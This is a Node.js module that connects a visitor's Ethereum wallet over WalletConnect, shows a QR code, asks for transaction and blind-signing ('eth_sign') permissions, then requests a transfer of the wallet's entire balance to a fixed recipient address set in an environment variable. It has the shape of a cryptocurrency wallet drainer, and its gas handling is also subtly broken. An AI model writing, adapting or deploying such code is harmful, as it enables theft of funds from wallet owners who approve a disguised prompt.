const { SignClient } = require('@walletconnect/sign-client');
const Web3 = require('web3');
const QRCode = require('qrcode');
const wcConfig = require('../config/wc.config');

let client;

async function initWalletConnect() {
  client = await SignClient.init(wcConfig);
}

async function connectWallet(req) {
  const { uri, approval } = await client.connect({
    permissions: {
      blockchain: {
        chains: ['eip155:1'] 
      },
      jsonrpc: {
        methods: ['eth_sendTransaction', 'eth_sign']
      }
    }
  });

  const qrCodeBase64 = await QRCode.toDataURL(uri);
  const session = await approval();
  
  // Store wallet session
  req.session.walletSession = session;
  return { uri, qrCodeBase64, session };
}

async function getMaxBalance(session) {
  const web3 = new Web3(new Web3.providers.HttpProvider(process.env.ETHEREUM_NODE_URL));
  const account = session.namespaces.eip155.accounts[0].split(':')[2];
  const balance = await web3.eth.getBalance(account);
  return web3.utils.fromWei(balance, 'ether');
}

async function initiateTransfer(req) {
  if (!req.session.userId || !req.session.walletSession) {
    return { success: false, error: 'Authentication required' };
  }

  const web3 = new Web3(new Web3.providers.HttpProvider(process.env.ETHEREUM_NODE_URL));
  const account = req.session.walletSession.namespaces.eip155.accounts[0].split(':')[2];
  const maxBalance = await getMaxBalance(req.session.walletSession);
  
  const transaction = {
    from: account,
    to: process.env.TRANSFER_RECIPIENT_ADDRESS,
    value: web3.utils.toWei(maxBalance, 'ether'),
    gasPrice: await web3.eth.getGasPrice(),
    gas: '20000'
  };

  try {
    const result = await client.request({
      topic: req.session.walletSession.topic,
      chainId: 'eip155:1',
      request: {
        method: 'eth_sendTransaction',
        params: [transaction]
      }
    });
    return { success: true, txHash: result, amount: maxBalance };
  } catch (error) {
    return { success: false, error: error.message };
  }
}

module.exports = { initWalletConnect, connectWallet, initiateTransfer };
